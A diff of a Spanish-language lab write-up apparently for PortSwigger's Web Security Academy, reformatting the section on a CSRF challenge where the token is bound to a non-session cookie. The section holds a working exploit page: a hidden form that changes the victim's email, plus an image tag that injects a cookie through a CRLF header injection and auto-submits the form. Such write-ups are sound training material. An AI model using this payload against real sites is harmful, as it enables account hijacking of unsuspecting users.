@@ -399,9 +399,7 @@ document.forms[0].submit();
 </script>
 ```
 
-## Reto 5:
-
-CSRF donde el token está vinculado a una cookie que no es de sesión
+## Reto 5: CSRF donde el token está vinculado a una cookie que no es de sesión
 
 La función de cambio de correo electrónico de este laboratorio es vulnerable a ataques CSRF. Utiliza tokens para intentar prevenirlos, pero no están completamente integrados en el sistema de gestión de sesiones del sitio.
 
@@ -424,10 +422,11 @@ Para explotarlo:
 
 
 
-
+```html
 <form class="login-form" name="change-email-form" action="https://0ab000ad03b528c2804e494300ab003f.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="setensa@setensa.com">
     <input type="hidden" name="csrf" value="pCGHRoz1Ojj2I3PcpNZXXnrm0Hg7a9pv">
 </form>
 
 <img src="https://0ab000ad03b528c2804e494300ab003f.web-security-academy.net/?search=prueba%0d%0aSet-Cookie:csrfKey=icFb4T1G90YQOOcY9djppswJCSCqjNGs%3b%20SameSite=None" onerror="document.forms[0].submit();">
+```
